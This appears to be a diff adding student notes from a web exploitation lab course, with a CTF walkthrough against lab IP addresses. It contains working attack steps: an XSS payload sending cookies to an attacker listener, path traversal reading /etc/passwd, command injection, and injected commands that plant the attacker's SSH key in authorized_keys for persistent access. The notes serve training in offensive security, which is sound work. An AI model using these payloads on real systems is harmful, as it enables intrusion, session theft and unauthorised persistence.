@@ -1,0 +1,126 @@
+Web Exploitation Part 1
+
+Server/client Relationship
+
+HTTP Methods:
+ - GET 
+ - POST
+ (We will be using GET and POST mostly)
+ - HEAD
+ - PUT
+HTTP Response Codes:
+ 10X == Informational
+ 2XX == Success
+ 30X == Redirection
+ 4XX == Client Error    EX: 404 page not found
+ 5XX == Server Error
+ 
+ https://tools.ietf.org/html/rfc2616
+ 
+In case firefox locks up
+  ps -elf | grep firefox 
+  kill firefox session
+  Do not force quit since it'll close terminator
+  
+HTTP Fields
+  - User-Agent
+  - Refer
+  - Cookie
+  - Date 
+  - Server
+  - Set-Cookie
+  
+Every user is able to cat or read /etc/passwd
+
+Traversing the file system
+  10.50.35.106/path/pathdemo.php/myfile../../../../../../../../etc/passwd
+    
+We only use wget for ftp, and for http we use the web browser
+We won't be using curl
+
+Robots.txt is one of the first places to look for enumeration of a website.
+
+Enumeration Tools:
+  - NSE scripts
+  - Nikto (Very loud) nikto -h http://
+  - Burp suite (Advanced and not a part of class) 
+  
+<script>document.location="http://<linops IP>:<listening port>" + document.cookie;</script>
+  (Scripts can be ran through various input methods like a chat on twitch)
+  
+Server-Side injection
+  Directory Traversal/Path Traversal
+  
+Command Injection
+  system("ping -c 1 ".$_GET["ip"]); (The semicolon is the end of the command)
+  Run this after the previous command (; cat /etc/passwd)
+  
+  
+Command Injection demo/////////////////////////////////////////////////////
+  This part you would do after successfully setting up a ping prompt on http://10.50.35.106/cmdinjection.cmdinjectdemo.php
+   For directory traversal: ../../../../../../etc/passwd
+   Format for commands on command injection: ; <command>
+   How to check home directory on any user ---->  cat /etc/passwd 
+   
+   (On lin ops)ssh-keygen
+   cat /home/student/.ssh/id_rsa.pub <---(File path from ssh-keygen ouput)
+   (On Firefox) ; mkdir /var/www/.ssh/authorized_keys
+   (Check is it was made) ; ls -la /var/www/.ssh
+   Copy this down
+   ;echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDWx2WIm0mGuN1fqof6vv2tlDP8HXwJuyrupGpoQ1aj66AMWdK03hwQWd6um0/eZsEz2QiQ0OV/vCfnDocToFujaoOJ8nj18J4ojrFG+PGGpZ+EmCS6xiSirWtQqLujQUGFnJsBS3A/rSFCtMQhFtYfSackSdKp1C2xZ1ovcI9ZVuc1aGEYZqIEjmngnWhZwsSX/2reEkysdoouQb8Z+bEXeyHqc5uTXua9oFSOQzalX0ckXKgQUBZPXlSC9bjgmDyeT7ZPlTn4cfEeVGvu0+zAR3XBc7k3g5VcWsx63RhfEYzHgzWAPebVk3iB+0zA9q48GomIVWrPhaiHK0BfMoW9 student@lin-ops" >> /var/www/.ssh/authorized_keys
+                        ^---- Home Directory   
+  Verify contents
+  ;cat /var/www/.ssh/authorized_keys
+  
+  (Don't use your private key since it's supposed to be private, which means it is good for offensive operations)
+           
+  ssh www-data@10.50.35.106 
+         ^------(Current User)
+         
+////////////////////////////////////////////////////////////////////////////////////////////
+
+CTFs
+  Scheme of Maneuver:
+  >Jump Box
+  ->T1:10.100.28.40
+
+
+
+1st Terminal
+  ssh -MS /tmp/jump student@10.50.29.89  (connection to jump box)
+2nd Terminal
+  ssh -S /tmp/jump jim
+3rd Terminal
+  ssh -S /tmp/jump jim -O forward -D9050
+  proxychains nmap 10.100.28.40 -T4 -Pn -vvvv -p 1-9999
+  ssh -S /tmp/jump jim -O forward -L 3250:10.100.28.40:80 -L 3251:10.100.28.40:4444
+  (Make sure to clear firefox browser data)
+  firefox&
+  (in URL) http://127.0.0.1:3250
+  http://127.0.0.1:3250/robots.txt  
+  http://127.0.0.1:3250/net_test
+  (In Path to test text box) ; cat ../../../../../../../etc/passwd
+  ; pwd
+  4th Terminal
+  ssh-keygen
+  cat /home/student/.ssh/id_rsa.pub (Copy)
+  ; mkdir /home/billybob/.ssh (There was already a .ssh :( )
+  ; ls -la /home/billybob
+  ; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGTCWsPOXK7aSR8wPc8WRKTc0DSzKItRBRsc9xXic+MGQ4c6/VYDonUJM2kQPWUWY/GyKPqTn7GtCQ/j3GbTKyDobXJ63IG7uAOa/+An6Xl+7M8JCK4oW8d9Jga4qK9q8mEtWwD2MB96E46GOHCdAQRLJW6GxJq2CCj+YJi/npcKAG9qNUaSXOZC6rGVfDh7vrCdHSoYin/bHTk06r4UtBQ3yFHfWTz/Z0KiM/HMoBY1Gt0NRy4KWDI1sOFtGCv76lOOlkUuzF85j0DPHN+ZcEGhu01b2w4VG+lm1Oqtla7EqHikvVV4tE7D+HDnVIFNbndhXt24JifOUjER04CTed student@lin-ops" >> /home/billybob/.ssh/authorized_keys
+   ; ls -la /home/billybob/.ssh
+   ssh billybob@127.0.0.1 -p 3251
+   (Check home directory for other users)
+   ; pwd (Results /var/www/html/net_test /var/www/html/net_test)
+   (Look down that path for site information)
+   
+   Now you go onto the new IP: 10.100.28.55
+   
+   
+   
+   
+   ssh -MS /tmp/truck billybob@127.0.0.1 -p 3251
+   ssh -S /tmp/truck truck -O forward -L 3261:10.100.28.55:80
+   (On firefox) http://127.0.0.1:3261
+   Once on the site inspect it and find the function for printing a certificate
+   Found in Facultaion guide 
+   view_image.php?file=../../etc/passwd   (Formating for finding /etc/passwd through the url)
